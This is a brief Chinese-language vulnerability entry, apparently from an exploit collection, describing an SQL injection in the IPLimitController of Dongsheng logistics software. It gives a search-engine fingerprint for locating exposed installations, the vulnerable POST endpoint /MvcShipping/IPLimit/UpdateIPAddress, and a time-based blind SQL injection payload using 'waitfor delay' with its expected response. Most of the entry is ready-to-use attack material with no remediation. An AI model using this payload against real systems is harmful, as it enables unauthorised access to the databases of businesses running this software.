# 东胜物流软件IPLimitControllerSQL注入漏洞

东胜物流软件IPLimitController ｜ SQL注入 ｜ —
- **指纹**：`app="东胜物流软件-物流软件"`
- **请求**：`POST /MvcShipping/IPLimit/UpdateIPAddress HTTP/1.1`

**Payload**
```
name=’ waitfor delay’0:0:3’--
```
- **响应特征**：200